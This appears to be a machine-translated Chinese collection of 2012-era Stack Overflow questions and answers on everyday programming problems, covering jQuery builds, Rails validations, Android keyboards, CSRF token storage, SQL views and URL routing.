有没有人看到一个干净的解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T15:41:59.143

对于不报告方向的 android 设备，没有干净的解决方案。

对于所有其他方向，我的想法过于复杂。前后翻转意味着如果顺时针旋转角度是正确的

# javascript - jquery.js 和 jquery.lite.js 有什么区别？

> ID：12264504
> 
> 赞同：15
> 
> 时间：2012-09-04T13:27:18.970
> 
> 标签：javascript, jquery

当我下载 jQuery zip 文件[LINK](http://jqueryjs.googlecode.com/files/jquery-1.2.5-release.zip)。它给了我4个不同的文件：

*   jQuery.js
*   jquery.lite.js
*   jquery.min.js
*   jquery.pack.js

`pack.js`是该 js 文件中压缩程度最高的文件，并且`min`已被缩小。所以我有两个问题...

1.  `jquery.js`和有什么区别`jquery.lite.js`。查看代码时似乎没有区别。
2.  什么更好使用`min.js`或`pack.js`在实时网站上？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-04T13:36:08.870

**回答问题：**

**jquery.js** - 完全扩展，包括评论。

**jquery.lite.js** - 不再真正相关 - 新版本不提供这个 - 它主要用于缺乏评论和较少使用的功能。

**jquery.min.js** - 现在主要使用的一个 - 所有空格和注释都被删除了。

**jquery.pack.js** - 体积更小 - 但需要“解包”时间，有点像 rar/zip。

但老实说，正如其他人所提到的，尽可能使用[最新版本](http://jquery.com/download/)的 jQuery。

-

**2018年更新信息**：

**压缩生产**- 删除和缩小代码，没有空格/换行符，人类难以阅读，但体积更小，因此加载速度更快。

**未压缩的生产**- 较大的文件大小，开发人员更容易处理，但由于不必要的文件大小，不应在生产中使用。

**映射文件**- 帮助开发人员/Web 浏览器在压缩之前找到对 JS 代码原始位置的引用。

**Slim 构建**- 这个版本的 jQuery 不包含一些较大的库，例如 AJAX 和效果模块。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-04T13:35:24.860

如果您正在寻找 CDN，请使用 Microsoft 或 Google cdn：

[https://developers.google.com/speed/libraries/devguide#jquery](https://developers.google.com/speed/libraries/devguide#jquery)

或者

[http://www.asp.net/ajaxlibrary/cdn.ashx#jQuery_Releases_on_the_CDN_0](http://www.asp.net/ajaxlibrary/cdn.ashx#jQuery_Releases_on_the_CDN_0)

使用最新版本，`.lite.js`不是官方的 jQuery 版本，对于`.pack.js`.

在 jQuery 网站上，您只能找到生产（缩小）或开发（非缩小）版本。

在这里：[http](http://docs.jquery.com/Downloading_jQuery) ://docs.jquery.com/Downloading_jQuery你会找到关于 jQuery 版本的所有官方信息。

# ruby-on-rails - 从零开始的声誉系统。将 current_user 投票数限制为 1

> ID：12264505
> 
> 赞同：0
> 
> 时间：2012-09-04T13:27:23.510
> 
> 标签：ruby-on-rails, ruby-on-rails-3, railscasts

在[这个截屏视频](http://railscasts.com/episodes/364-active-record-reputation-system)中， Ryan Bates 展示了如何从头开始实施信誉系统。但是有没有办法只给 current_user 1 票，并检查用户是否已经为应用投票，如果是，限制投票的可能性？

**我认为user.rb**中这样的东西应该可以工作，但我不知道如何准确地写它

```
 def has_one_vote
      Restrict amount of user votes to 1
   end 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:45:46.387

我假设您有用户、投票和帖子，并且用户对帖子进行投票。

您应该在属性上的`Vote`类中添加一个唯一性验证器`user_id`，范围为`post_id`. 这将用户对给定帖子的投票数限制为一：

```
class Vote
  belongs_to :user
  belongs_to :post

  validates :user_id, uniquness: { scope: :post_id }
end 
```

* * *

要限制用户可以创建的投票*总数，请从**唯一*`scope`性验证器中删除 ，或者（更正确地）将外键移动到`users`表中。

也就是说，要么这样：

```
class Vote
  belongs_to :user
  belongs_to :post
  validates :user_id, uniquness: true
end 
```

*或者*这个：

```
class User
  belongs_to :vote
end 
```

# java - Hibernate - 查询可能不存在的属性

> ID：12264509
> 
> 赞同：0
> 
> 时间：2012-09-04T13:27:30.447
> 
> 标签：java, hibernate, hibernate-criteria

提前感谢您提供的任何帮助。

我有一些带有属性的对象，比如“已删除”。我试图找到一种方法来过滤 Hibernate Container 中的属性，而不必为具有此属性的类实例化子容器。

如果我使用类似的东西：

```
criteria.add(Restrictions.eq("deleted", true)); 
```

那么当不包含此属性的对象通过容器时，我当然会得到错误。

是否有 Restriction、Alias、Projection、Whichever 可以确定此属性是否存在并应用限制（如果存在）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:17:02.593

不，但是您可以自己编写它，方法是使用[`SessionFactory.getClassMetadata(Class entityClass)`](http://docs.jboss.org/hibernate/core/3.6/javadocs/org/hibernate/SessionFactory.html#getClassMetadata%28java.lang.Class%29)并检查类中是否有`deleted`属性（布尔类型）。

# c++ - 将 int y 转换为向量时出错 有任何想法吗？

> ID：12264516
> 
> 赞同：0
> 
> 时间：2012-09-04T13:27:45.610
> 
> 标签：c++, vector, int

我是 C++ 新手，不知道出了什么问题。这是我在 uni 的编程课程中给出的一项任务，旨在获取用户输入的成绩向量并确定成绩是否及格。当我编译时，我最终得到一个错误，指出 q1.cpp:30:21: error: could not convert 'y' from 'int' to 'std::vector' 不太确定为什么。很抱歉格式错误。

我已经添加了代码，但不知道如何包装它。

```
#include <vector>
#include <cstdlib>
#include <iostream>

using namespace std;

int calcNumberOfPasses(vector<int> grades){
int x;
    for (int i=0; i<grades.size(); i++){
        cin >>grades[i];
    }
    cin >> x;
}

int main() {
    int y;
    vector<int> nGrade;
    nGrade.push_back(y);
    cout << "Enter how many grades you want to enter";
    for (int i=0; i<nGrade.size();i++){
        cin >> nGrade[i];
    }
    cin >> y;
    if (y>=50){
        cout << "this is a passing grade";
    }
    calcNumberOfPasses(y);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:32:29.097

该函数`calcNumberOfPasses`需要一个类型的参数`vector<int>`，您正在向它传递一个类型的参数`int`。您可以从错误消息中得出这么多。

您正在将未定义的值复制到此行的向量中：

```
nGrade.push_back(y); // y hasn't been initialised yet, you probably want to remove this line. 
```

之后，您将遍历尚未初始化的等级向量的大小。

很有可能，你想做`calcNumberOfPasses(nGrades);`。

顺便说一句，您应该使用对向量的引用，以避免复制它。

总之，我会通过所有这些代码并重新开始。没有恶意！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:40:48.807

A`vector`是一个集合——一些基类的项目的分组。它在概念上类似于数组。您正在做的是尝试重复加载单个变量，然后将其传递给需要`vector`.

尝试分解您正在编写的函数的步骤。你是：

1.  将一个未初始化的单个添加`int`到`vector`.
2.  试图检索一个数字来控制您要输入的成绩数量。
3.  将一个附加数字读入 y。
4.  将该单个数字传递给需要数组的函数。

这个功能有很多问题；我认为你需要确定哪些数据需要去哪里。

# android - 在 Android 中显示/隐藏软键盘事件

> ID：12264518
> 
> 赞同：1
> 
> 时间：2012-09-04T13:27:48.120
> 
> 标签：android, events, keyboard, android-softkeyboard

我需要从 Android 的 SoftKeyboard 中获取 Show/Hidden 事件。

我做了一个研究，但没有任何效果。

我想要那个，因为我们使用的是低分辨率的平板电脑 5.0，所以当你编辑 EditText 时，键盘会全屏显示，然后或者你按下“enter or next”键，或者你按下后退按钮隐藏键盘...我需要用新值更新一些字段，但我不能使用 TextWatcher 因为有一些业务逻辑关于什么是正确的字段来更新，并且因为我只想更新当用户真正完成输入时。

并且 onFocusChanged 不是一个选项，因为我们不希望我们的客户需要在下一个字段中单击，并隐藏键盘以查看新值。

我也不想覆盖 onTouchEvent，看看用户单击的位置是否与他正在编辑的字段不同。

对于我要求的具体问题和更具体的解决方案，我深表歉意。

对不起我的英语不好：D

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-08T11:45:52.173

使用树视图观察器来检测视图高度的任何变化，届时您可以检查键盘状态是否

```
 final View activityRootView = findViewById(R.id.chat_pane_root_view);
                activityRootView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener()
                {
                    @Override
                    public void onGlobalLayout()
                    {
                        InputMethodManager mgr = (InputMethodManager) mContext.getSystemService(Context.INPUT_METHOD_SERVICE);
                        if(mgr.isAcceptingText())
                        {
                             //keyboard is up
                        }
                    }
                }); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-04T14:14:28.697

首先，您在清单文件中声明您的活动，如下所示

```
<activity android:name="Map"  android:windowSoftInputMode="stateHidden"> 
```

从这个属性你的键盘被隐藏了，之后你在你的 main.xml 文件中声明了 imeOption 属性，像这样编辑文本

```
<EditText
                    android:id="@+id/edttexttitle"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:layout_marginBottom="5dp"
                    android:layout_marginTop="5dp"
                    android:hint="@string/tasktitle"
                    android:imeOptions="actionNext"
                    android:inputType="text"
                    android:textSize="@dimen/font_size_medium"
                    android:textColor="@color/darkgray1" /> 
```

此代码适用于您的第一个 edittext，如果有多个且只有一个 edittext，则您需要更改 edittext 的 imeOption，例如

```
android:imeOptions="actionGo" 
```

# iphone - 按钮操作在 iphone 中不起作用？

> ID：12264519
> 
> 赞同：1
> 
> 时间：2012-09-04T13:28:05.733
> 
> 标签：iphone, ios, ipad

我有一个 iPhone 应用程序，我在其中添加了一个自定义视图，而不是导航栏视图。我在正常情况下隐藏了该自定义视图，并在需要时取消隐藏它。现在我正在向该自定义视图添加一个具有操作的按钮。但是当我单击它时，没有任何操作正在工作。有人可以帮助我吗？这是我在视图 didload 中的代码片段

```
curtainsView=[[UIImageView alloc]init];
curtainsView.image=[UIImage imageNamed:@"curtains.png"];
curtainsView.frame=CGRectMake(0,-44, 320, 60);
curtainsView.backgroundColor=[UIColor clearColor];
UIImage *button2Image = [UIImage imageNamed:@"scroll_down.png"];
scroll = [[UIButton buttonWithType:UIButtonTypeCustom] retain];
self.scroll.tag=100;
[scroll setImage:button2Image forState:UIControlStateNormal];
self.scroll.frame = CGRectMake(270,0, 40,40);
[scroll addTarget:self action:@selector(backpressed:) forControlEvents:UIControlEventTouchUpInside]; 
[self.curtainsView addSubview:scroll];
[self.view addSubview:curtainsView];
[self changeNavigationBarTitleTo:@""];
[curtainsView setHidden:YES]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:37:12.910

您必须启用窗帘视图的用户交互。

尝试这个：

```
[curtainsView setUserInteractionEnabled:YES] 
```

来自 Apple 的[UIImageView 类参考](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIImageView_Class/Reference/Reference.html)

> 新的图像视图对象默认配置为忽略用户事件。如果要在 UIImageView 的自定义子类中处理事件，则必须在初始化对象后将 userInteractionEnabled 属性的值显式更改为 YES。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-15T11:04:30.607

启用窗帘视图的用户交互。

```
[curtainsView setUserInteractionEnabled:YES] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T17:42:33.517

我不知道您的整个代码为什么要隐藏视图，但我想说的是，将您添加`UIButton`到您的`self.view`而不是`self.curtainsView`.
只需对您的代码进行一些更改。

```
[self.view addSubview:curtainsView];
[self.view addSubview:scroll]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T14:35:45.120

检查`backPressed`方法的签名。起初我绊倒了，没有意识到`@selector(backpressed:)`寻找：

```
-(void)backPressed:(id)sender { // the colon indicates the first argument 
```

如果您的签名没有发件人参数，您将需要添加一个或删除冒号`@selector`。IE：

```
-(void)backPressed 
```

# php - 使用 cookie 代替会话来防止跨站点请求伪造

> ID：12264520
> 
> 赞同：1
> 
> 时间：2012-09-04T13:28:07.280
> 
> 标签：php, session, cookies

我需要向现有站点添加 CSRF 保护，我指的是[http://phpmaster.com/preventing-cross-site-request-forgeries/](http://phpmaster.com/preventing-cross-site-request-forgeries/)作为如何防止 CSRF 的指南。

在链接中，建议我们使用 $_SESSION 作为存储令牌的一种方式。我想知道使用 $_COOKIE 是否同样安全。使用 $_COOKIE 而不是 $_SESSION 有什么缺点吗？

**编辑**：知道使用 $_COOKIE 而不是 $_SESSION 是否符合 PCI 标准？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:39:50.170

在绝大多数情况下，PHP 会话标识符也是通过 cookie 传输的（会话 cookie）。

如果您的网站也是如此——几乎可以肯定——那么考虑一下如果攻击者获得对您的 cookie 的访问权（例如通过 XSS）会发生什么：他们不需要 CSRF，因为他们可以简单地劫持会议并从前门进入。结论：如果将 CSRF 令牌存储在 cookie 中，不会有额外的安全风险。

使用额外的 CSRF cookie 的一个小缺点是它会使传入的 HTTP 流量增加一点点，但这实际上只是理论上的差异。

# c# - 没有 .NET 的 C# GUI

> ID：12264521
> 
> 赞同：1
> 
> 时间：2012-09-04T13:28:09.887
> 
> 标签：c#, .net, user-interface

我想开发一个 Windows GUI 程序，它以图形方式表示从文件中读取的数据。我已经有一个应用程序可以做到这一点，但它做得非常糟糕并且使用 C++/MFC。

我可以尝试编辑这个应用程序来做我想做的事，但我对 MFC 一无所知，而且我对 C# 比 C++ 更舒服，所以我更愿意从头开始重建。

问题是，我不想安装 .NET 框架来运行这个应用程序。这减少了对 WinForms 或 WPF 的任何使用，所以我想知道是否有任何类似的用于 C# 的 GUI API 可以用于不使用 .NET 的这个？

编辑：我现在可能也需要移植到 Linux 机器上。如果我将 Qt 与 C++ 一起使用，我可以为 Windows 或 Linux 编译，对吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:32:21.513

您不能，您将需要 .NET 框架或 Mono 之类的替代方案来运行 C# 应用程序。您可以使用较低版本的框架，比如 2.0 而不是 4.5，它默认安装在 XP 和更高版本上。

[编辑]

再想一想，我记得有某种可移植的 .NET 框架正在开发中，不确定它是否已经到了完全稳定的阶段，但如果你真的想要其中的东西，可能值得一试方向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:33:28.823

[C#](http://msdn.microsoft.com/en-us/library/z1zx9t92.aspx)是一种优雅且类型安全的面向对象语言，使开发人员能够构建在 .NET Framework 上运行的各种安全且强大的应用程序。没有 .net 框架 C# 程序将无法工作（期望您可以使用 MONO，但 MONO 仍然是框架）

所以如果你想要框架独立，C#是错误的选择你可能想使用较低版本的框架，因为所有win xp机器都安装了.net 2，这种情况下你可以使用.net 2支持的WinForm

# sql - 包括最后一个值的最佳视图

> ID：12264524
> 
> 赞同：0
> 
> 时间：2012-09-04T13:28:19.167
> 
> 标签：sql, view

我有一个包含以下列的表格：

```
ConnectionId INT - primary key, identity,
ServerId INT, 
ClientId INT, 
Time DATETIME, 
ConnectionType INT 
```

如何定义一个最佳视图，该视图返回每个组合的所有组合`ServerId`以及`ClientId`最后连接的时间和类型？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:06:18.013

假设您使用的是支持排名功能的数据库（例如 SQL Server 2005+、Oracle、Postgres、DB2、Teradata ......），您可以这样做：

```
create view as
    select ServerId, ClientId, time, type
    from (select t.*,
                 row_number() over (partition by ServerId, ClientId order by time desc) as seqnum
          from t
         ) t
    where seqnum = 1 
```

我不知道您所说的“最佳视图”是什么意思。如果您希望它更好地工作，请在 ServerId、ClientId 和 time 上创建一个由三部分组成的索引。

# html - 让访问者选择背景的 PHP 代码

> ID：12264526
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:28:23.333
> 
> 标签：html, background

我有一个脚本，允许访问者在我的网站上选择背景。我的网站上的主要内容有问题。在 Chrome 上，事物的位置发生了一些变化，现在 IE 一切正常。

当我删除后台脚本时

```
<style> body { background: url('http://domain.com/assets/<?php echo "".$_SESSION["USER"]["bg"]."" ?>.jpg') top left; } </style> 
```

该脚本适用于更改 BG，但我无法弄清楚为什么它会更改跟踪幻灯片。

![比较](../Images/a8f009f50b193abd097200b363f0f974.png)

**更新：已解决**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T17:46:18.910

使用 Doctype 声明。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"> 
```

如果它不起作用，请尝试使用不同的 doctype 声明。

关于文档类型：

声明不是 HTML 标签；它是对 Web 浏览器的指示，说明页面是用什么版本的 HTML 编写的。

在 HTML 4.01 中，声明指的是 DTD，因为 HTML 4.01 是基于 SGML。DTD 指定标记语言的规则，以便浏览器正确呈现内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:12:14.667

例如，我将使用嵌入式样式并使用“背景”来设置位置顶部和左侧。

```
<?php
     $bgid = $_SESSION['User']['bg'];
?>
<style> body {
      background: url('http://domain.com/assets/<?php echo $_SESSION["USER"]["bg"] ?>.jpg') top left;
} </style> 
```

IE 非常挑剔，请确保您在 url 的每一侧都有一个单引号 ' 并确保明确指定左上角的位置，或者如果您不希望背景重复，请在末尾添加 no-repeat。

我只是在做假设，因此它可能会或可能不会起作用，具体取决于确切的问题。我希望这有帮助 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-05T11:51:57.143

```
Put this code in footer before body tag close    

<script> 
document.body.background = '<?=$bgid?>'+'.jpg'; 
</script> 
```

# .net - .NET IFRAME 与 ASP Classic 表单交互

> ID：12264527
> 
> 赞同：0
> 
> 时间：2012-09-04T13:28:27.513
> 
> 标签：.net, iframe, asp-classic

我有一个需要添加功能的经典 ASP 表单。我不知道 ASP 经典。我知道.NET。我正在努力思考最适合我的方式。

建议的选项之一是使用 IFRAME，它将在 .NET 中构建，并将其嵌套在经典的 ASP 形式中。

两人有没有可能互动呢？将值从经典发送到 .NET IFRAME 并从 IFRAME 发送到父窗体（假设两个页面在同一个域中）？

另外，有谁知道跨浏览器/移动设备的 IFRAMES 是否存在兼容性问题？

最后，如果有人对如何解决这个问题有任何其他建议，我愿意倾听。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:31:12.490

[您](https://stackoverflow.com/questions/2569768/how-to-communicate-between-frames)可能对此感兴趣。在同一个域中，您可以在帧之间发送消息。我记得曾经在以前的雇主那里做过这件事，但我真的不记得细节了。所以这只能让你开始，我不能提供一个真正的解决方案。

# azure - 在 Windows Azure 上删除 Orchard CMS 的 App_Data

> ID：12264528
> 
> 赞同：1
> 
> 时间：2012-09-04T13:28:27.797
> 
> 标签：azure, sql-server-ce, orchardcms

我使用 SQL Compact 数据库在运行 Orchard CMS 的 azure 上创建了一个网站。似乎工作正常。但是，我只想将其用作我需要在线/在云中的模块的测试场。作为一个相当无用的开发人员，我已经打破了它。在我的本地机器上，或者在 IIS 上，我只是哭了一会儿，删除 App_Data 文件夹，然后继续。都好。

所以我的问题是，有没有办法在 Azure 上删除这个文件夹？或者做类似的事情？我真的不知道 Azure 是如何工作的，第一次使用它。App_Data 文件夹是存储 Sql-Server-CE 文件的位置。

非常感谢任何帮助或提示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:39:44.710

根据您的问题，我假设您正在使用[Windows Azure 网站](http://www.windowsazure.com/en-us/home/scenarios/web-sites/)，并且您已经从图库中创建了 Orchard。

如果是这样，那么您需要做的就是使用 FTP 登录并再次删除 app_data 文件夹。您可以在此处创建登录凭据：

![Azure 网站凭据](../Images/529ef47261e4fc3e60a4200317b4bf88.png)

请注意，在您拥有凭据之前，该链接将是“创建部署凭据”

您可以在此处找到 FTP 主机名：

![Azure 网站 ftp 主机](../Images/3f76526eee74477f95b7a67a111c7119.png)

您可以使用任何 FTP 客户端连接到 FTP。

您还可以使用 WebMatrix 编辑您的站点。

[这是部署凭据的一个很好的解释](https://github.com/projectkudu/kudu/wiki/Deployment-credentials)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:40:04.253

如果您想在开发时手动删除 App_Data 文件夹，您有几个选择：

*   对于 Azure 网站，您可以[通过 FTP 连接](http://blogs.msdn.com/b/avkashchauhan/archive/2012/06/19/windows-azure-website-uploading-downloading-files-over-ftp-and-collecting-diagnostics-logs.aspx)并删除文件夹
*   对于 Web 角色（云服务），您可以[通过 RDP 连接](http://msdn.microsoft.com/en-us/library/windowsazure/gg443832.aspx)并删除文件夹（不要对实时部署执行此操作，因为不会保留通过 RDP 进行的更改）。

但是为什么不在本地做所有事情，简单地使用 WebDeploy/WebMatrix 来看看它是如何在云中运行的呢？

# .net - 在发布模式下编译 silverlight 程序集时缺少 IL 偏移

> ID：12264543
> 
> 赞同：8
> 
> 时间：2012-09-04T13:29:12.293
> 
> 标签：.net, silverlight, il

我按照[这些说明将 IL 偏移添加到 Silverlight 堆栈跟踪](http://liviutrifoi.wordpress.com/2011/04/21/silverlight-stack-trace-line-numbers/)。这在 DEBUG 模式下构建时效果很好，但是我们的生产/qa 构建过程使用 RELEASE 模式编译所有内容，这似乎丢失了 IL 偏移信息。在发布模式下，所有 IL 偏移量最终都为“0xffffffff”。使用反射器比较调试/发布程序集我注意到[DebuggableAttribute](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute%28v=vs.95%29)的使用方式不同。

调试构建：

```
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: ComVisible(false)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.EnableEditAndContinue | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.Default)]
[assembly: AssemblyConfiguration("Debug")]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows=true)]
[assembly: Extension]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyInformationalVersion("1.0.0")]
[assembly: CompilationRelaxations(8)]
[assembly: TargetFramework("Silverlight,Version=v5.0", FrameworkDisplayName="Silverlight 4")]
[assembly: AssemblyCopyright("Copyright @ Foo Company 2010-2012")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyTitle("Foo.Ria.Bar")]
[assembly: AssemblyCompany("Foo Company")]
[assembly: AssemblyProduct("Foo Product")] 
```

与发布构建：

```
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: ComVisible(false)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows=true)]
[assembly: AssemblyInformationalVersion("1.0.0")]
[assembly: AssemblyConfiguration("Release")]
[assembly: AssemblyTitle("Foo.Ria.Bar")]
[assembly: AssemblyTrademark("")]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: CompilationRelaxations(8)]
[assembly: TargetFramework("Silverlight,Version=v5.0", FrameworkDisplayName="Silverlight 4")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyCompany("Foo Company")]
[assembly: AssemblyProduct("Foo Product") 
```

[MSDN 说](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute%28v=vs.95%29)

> DebuggableAttribute类控制运行时如何处理模块中的代码[。](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute%28v=vs.95%29)运行时可能会跟踪有关生成的代码的额外信息，并且可能会根据此属性中包含的值禁用某些优化。

有没有人有调整[DebuggableAttribute](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute%28v=vs.95%29)设置的经验？是否有任何不涉及完全禁用优化的解决方法（[DebuggingModes.DisableOptimizations](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute.debuggingmodes%28v=vs.95%29.aspx)）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-12-05T11:31:30.230

由`DebuggableAttribute`编译器添加以控制 JIT 代码生成。事实上，当代码应该是可调试的并且某些优化没有发生时，它会以不同的方式生成。

如果您需要调整生成的程序集，您需要转储 IL，更改属性并通过以下方式重新编译它：[ildasm](https://docs.microsoft.com/en-us/dotnet/framework/tools/ildasm-exe-il-disassembler)创建一个人类可读的 IL 源代码，可以通过传统文本编辑器进行更改，而[ilasm](https://docs.microsoft.com/en-us/dotnet/framework/tools/ilasm-exe-il-assembler)用于重新编译它.

这个过程可以在您的构建中自动化。请记住，您正在弄乱编译器生成的某些内容，并且不应该被触及。

重要提示：如果使用强名称和/ir 验证码，则需要再次对程序集进行签名。

# php - 如果有很多规则，我们如何在 Apache for php 中高效地编写 URL 重写规则？

> ID：12264546
> 
> 赞同：1
> 
> 时间：2012-09-04T13:29:19.177
> 
> 标签：php, apache, mod-rewrite, url-rewriting

如果我们有许多无法规范化的规则，那么 .htaccess 中将有一长串规则，这可能表现为一个长的 if-else 条件。

有什么办法，我们可以有效地为一长串规则应用重写规则？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:32:24.353

是的，根本不使用 .htaccess。只需将所有内容（图像、js、css 等除外）重新路由到 index.php 并在 PHP 中处理路由业务，而不是在 .htaccess 中。

使用 .htaccess 很痛苦。只需将所有内容转发到 index.php 并从那里开始。如果 url 是 www.google.com/test/bla/bla/，它将被重新路由到 www.google.com/index.php/test/bla/bla/。在 index.php 中，您可以分解字符串 'test/bla/bla/' 以在数组中获取您的参数。

你可以从那里做任何你想做的事情。

*编辑：* 这个解决方案没有真正的开销。你只是创造了无限的灵活性。你只需要一些东西：

**A）**一个网址解析器。您可以根据需要将其复杂化。你可以让它爆炸网址，就是这样。您可以使用[Reflection](http://en.wikipedia.org/wiki/Reflection_%28computer_programming%29)等复杂的功能对其进行扩展。一个极简的 url 解析器可能包含 5 行代码。（获取url，分解，返回数组。）

**B）**某种路由器/路由机制。根据 url 确定您应该发送请求的“位置”。url 解析器给了你一个参数列表——那个数组的结构是什么？

第一个参数总是某种控制器吗？然后尝试找到该控制器。第二个参数总是一个动作吗？在该控制器中搜索相应的操作。

或者......第一个参数是否总是解析到特定页面？然后包括该特定页面。

这一切都取决于您的要求和您的应用程序，但有一件事是肯定的：使用它总是比使用 .htaccess 更容易。您基本上可以在应用程序开发的任何阶段实现这一点，因为 url 保持不变，但只有处理方式不同。

*EDIT2* 哦，还有别的东西——如果你实现了这个解决方案，你最终得到一个有 100 个 case 的 switch 语句或一个无穷无尽的 if/else 条件块：你做错了。您应该始终能够拥有某种自动路由。

如果您的应用程序使用过程代码并且您使用包含：将所有“可包含”页面放在一个文件夹中，然后尝试通过包含它来解析页面。如果它不存在，则抛出错误。无需将每一页都放在 switch 语句中。在特定页面本身上；检查用户是否有足够的权限查看该页面。**不要在路由时这样做，路由器不应该知道安全上下文。**

如果您有一个带有控制器的面向对象结构，请确保您可以识别“操作方法”。使用文档块、前缀 (doSomething()) 或其他任何东西来确保路由器只能访问应该从外部访问的方法。至于安全性：**不要验证是否允许用户在路由器中调用该操作**。在面向对象的应用程序中有 100 种访问控制管理方式，但路由器仅用于路由。添加某种安全层，不要让路由器决定用户是否可以进来。如果**某些安全机制**发现用户没有足够的凭据，您可以**重新路由**请求。重新路由到某些“非法请求”页面。

 **这个答案有点太长了，并且详细说明了其他主题，而不仅仅是您要求的内容，对此我很抱歉。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:55:33.613

我同意 Robin v. G.

但是，如果您的项目到了无法返回并更改 PHP 中的路由机制的地步，您始终可以使用[ReWriteMap](http://httpd.apache.org/docs/current/rewrite/rewritemap.html)**

# eclipse-plugin - Eclipse 插件更新站点作为 zip 存档

> ID：12264549
> 
> 赞同：1
> 
> 时间：2012-09-04T13:29:23.803
> 
> 标签：eclipse-plugin, offline-caching

[我使用本教程](http://wiki.eclipse.org/FAQ_How_do_I_create_an_update_site_%28site.xml%29%3F)为我的插件创建了一个更新站点。从文件夹安装时，我的更新站点运行良好，但是当我将其放入 zip 并尝试“从存档”安装时，eclipse 似乎将其视为 jar 文件。

是否可以选择将插件正确分发为 zip 文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T16:07:28.340

看起来您正在创建一个旧式更新站点（即使用 site.xml 而不是使用 p2 的 Eclipse 3.4 之前的版本）。

您需要为更新站点生成 p2 元数据。查看本教程，了解创建 p2 感知更新站点的最简单方法：

[http://www.vogella.com/articles/EclipseP2Update/article.html](http://www.vogella.com/articles/EclipseP2Update/article.html)

p2 是 Eclipse 供应系统，它是用于在 Eclipse 中查找和安装插件和功能的组件。

# android - 当活动重新启动时，活动线程可以生存吗？

> ID：12264562
> 
> 赞同：0
> 
> 时间：2012-09-04T13:30:00.403
> 
> 标签：android, multithreading

我有一个线程 A 与串行设备连接蓝牙。当活动重新启动（屏幕旋转示例）时，线程与活动一起死亡，因此连接蓝牙结束。是否有一种方法可以在活动重新启动时使线程 A 存活或在连接蓝牙中存活？没有使用服务，我的老师告诉我不要将它用于此应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:36:37.583

用来`onRetainNonConfigurationInstance()`保留你的线程。请参阅涵盖此案例的[本教程。](http://www.vogella.com/blog/2011/07/12/threads-activity-lifecycle/)

# html - 如何使 DIV 匹配浮动子元素的高度（浮动列）并允许子元素在侧面突出

> ID：12264567
> 
> 赞同：6
> 
> 时间：2012-09-04T13:30:19.807
> 
> 标签：html, css, layout

我正在设计一个具有 3 列的布局，基于包含 3 个浮动 div 的 div。

问题是容器 div 与我想要的列的高度不匹配。它的行为就好像它根本没有内容一样，因此 3 列垂直突出。

为了解决这个问题，我尝试使用 overflow:hidden 并成功了，但我的设计有一个 div 在左侧突出，因为这个属性不会让任何东西突出。

有没有更好的方法来解决身高问题？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:36:49.340

你通常可以通过在`<div style="clear:both;"></div>`你所有的孩子之后扔一个权利来使容器的高度延伸到它的孩子的末端......就像这样。

```
<div id="container">
    <div class="child0"></div>
    <div class="child1"></div>
    <div class="child2"></div>

    <div style="clear:both;"></div>
</div> 
```

我不确定这是否被社区认为是黑客行为。但我有时会使用它。另外，我见过人们不使用 div，而是使用`<hr>`并应用这种样式。

* * *

